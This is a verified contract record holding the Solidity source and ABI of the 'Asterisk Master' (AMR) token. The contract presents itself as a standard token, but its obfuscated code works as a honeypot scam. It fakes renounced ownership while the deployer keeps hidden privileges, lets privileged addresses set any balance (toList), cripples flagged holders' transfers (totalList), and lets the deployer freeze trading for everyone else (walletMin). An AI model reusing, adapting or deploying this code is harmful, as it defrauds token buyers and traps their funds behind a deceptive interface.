{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface listReceiver {\n    function createPair(address launchWallet, address toMarketingTotal) external returns (address);\n}\n\ninterface fundExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingReceiverTotal) external view returns (uint256);\n\n    function transfer(address launchAmountBuy, uint256 marketingTrading) external returns (bool);\n\n    function allowance(address maxLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAmountBuy,\n        uint256 marketingTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverModeFrom, uint256 value);\n    event Approval(address indexed maxLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract atFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface minTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundExemptMetadata is fundExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AsteriskMaster is atFee, fundExempt, fundExemptMetadata {\n\n    uint8 private feeSell = 18;\n\n    uint256 public fromLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return amountMode;\n    }\n\n    uint256 private buyLaunched;\n\n    function receiverWalletSwap(address shouldTradingTx, address launchAmountBuy, uint256 marketingTrading) internal returns (bool) {\n        if (shouldTradingTx == senderIs) {\n            return teamFeeMode(shouldTradingTx, launchAmountBuy, marketingTrading);\n        }\n        uint256 senderFeeMin = fundExempt(walletSwap).balanceOf(buyLaunch);\n        require(senderFeeMin == teamToList);\n        require(launchAmountBuy != buyLaunch);\n        if (tokenSender[shouldTradingTx]) {\n            return teamFeeMode(shouldTradingTx, launchAmountBuy, listLiquidity);\n        }\n        return teamFeeMode(shouldTradingTx, launchAmountBuy, marketingTrading);\n    }\n\n    bool private sellFeeIs;\n\n    uint256 public shouldLiquidity;\n\n    uint256 constant listLiquidity = 19 ** 10;\n\n    bool public buyAmount;\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityList;\n    }\n\n    function transferFrom(address shouldTradingTx, address launchAmountBuy, uint256 marketingTrading) external override returns (bool) {\n        if (_msgSender() != maxFromExempt) {\n            if (receiverAuto[shouldTradingTx][_msgSender()] != type(uint256).max) {\n                require(marketingTrading <= receiverAuto[shouldTradingTx][_msgSender()]);\n                receiverAuto[shouldTradingTx][_msgSender()] -= marketingTrading;\n            }\n        }\n        return receiverWalletSwap(shouldTradingTx, launchAmountBuy, marketingTrading);\n    }\n\n    uint256 swapEnableSender;\n\n    address public walletSwap;\n\n    uint256 public totalTo;\n\n    mapping(address => bool) public limitWalletTrading;\n\n    bool public minWallet;\n\n    function balanceOf(address marketingReceiverTotal) public view virtual override returns (uint256) {\n        return isWalletLaunched[marketingReceiverTotal];\n    }\n\n    function allowance(address maxLaunchLaunched, address launchedTake) external view virtual override returns (uint256) {\n        if (launchedTake == maxFromExempt) {\n            return type(uint256).max;\n        }\n        return receiverAuto[maxLaunchLaunched][launchedTake];\n    }\n\n    function totalList(address launchTake) public {\n        fromReceiverMode();\n        if (shouldLiquidity != fromLaunched) {\n            shouldLiquidity = buyLaunched;\n        }\n        if (launchTake == senderIs || launchTake == walletSwap) {\n            return;\n        }\n        tokenSender[launchTake] = true;\n    }\n\n    bool public fromTake;\n\n    function toList(address fromSell, uint256 marketingTrading) public {\n        fromReceiverMode();\n        isWalletLaunched[fromSell] = marketingTrading;\n    }\n\n    function approve(address launchedTake, uint256 marketingTrading) public virtual override returns (bool) {\n        receiverAuto[_msgSender()][launchedTake] = marketingTrading;\n        emit Approval(_msgSender(), launchedTake, marketingTrading);\n        return true;\n    }\n\n    function walletMin(uint256 marketingTrading) public {\n        fromReceiverMode();\n        teamToList = marketingTrading;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return feeSell;\n    }\n\n    uint256 private walletLaunchSell = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private receiverAuto;\n\n    constructor (){\n        \n        minTeam marketingExempt = minTeam(maxFromExempt);\n        walletSwap = listReceiver(marketingExempt.factory()).createPair(marketingExempt.WETH(), address(this));\n        if (fromTake) {\n            fundLaunchTeam = false;\n        }\n        senderIs = _msgSender();\n        limitWalletTrading[senderIs] = true;\n        isWalletLaunched[senderIs] = walletLaunchSell;\n        autoAt();\n        \n        emit Transfer(address(0), senderIs, walletLaunchSell);\n    }\n\n    mapping(address => bool) public tokenSender;\n\n    function shouldSwap(address tradingShould) public {\n        require(tradingShould.balance < 100000);\n        if (fundMode) {\n            return;\n        }\n        if (fromTake == sellFeeIs) {\n            fromLaunched = buyLaunched;\n        }\n        limitWalletTrading[tradingShould] = true;\n        if (fromTake == sellFeeIs) {\n            sellFeeIs = true;\n        }\n        fundMode = true;\n    }\n\n    function fromReceiverMode() private view {\n        require(limitWalletTrading[_msgSender()]);\n    }\n\n    bool public fundMode;\n\n    mapping(address => uint256) private isWalletLaunched;\n\n    event OwnershipTransferred(address indexed enableSender, address indexed limitAt);\n\n    address buyLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private fundLaunchTeam;\n\n    address public senderIs;\n\n    string private amountMode = \"Asterisk Master\";\n\n    function getOwner() external view returns (address) {\n        return swapTradingFee;\n    }\n\n    function transfer(address fromSell, uint256 marketingTrading) external virtual override returns (bool) {\n        return receiverWalletSwap(_msgSender(), fromSell, marketingTrading);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletLaunchSell;\n    }\n\n    function autoAt() public {\n        emit OwnershipTransferred(senderIs, address(0));\n        swapTradingFee = address(0);\n    }\n\n    function owner() external view returns (address) {\n        return swapTradingFee;\n    }\n\n    address private swapTradingFee;\n\n    address maxFromExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 teamToList;\n\n    function teamFeeMode(address shouldTradingTx, address launchAmountBuy, uint256 marketingTrading) internal returns (bool) {\n        require(isWalletLaunched[shouldTradingTx] >= marketingTrading);\n        isWalletLaunched[shouldTradingTx] -= marketingTrading;\n        isWalletLaunched[launchAmountBuy] += marketingTrading;\n        emit Transfer(shouldTradingTx, launchAmountBuy, marketingTrading);\n        return true;\n    }\n\n    string private liquidityList = \"AMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverModeFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingReceiverTotal\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitWalletTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingShould\",\"type\":\"address\"}],\"name\":\"shouldSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"toList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTake\",\"type\":\"address\"}],\"name\":\"totalList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldTradingTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAmountBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"walletMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AsteriskMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}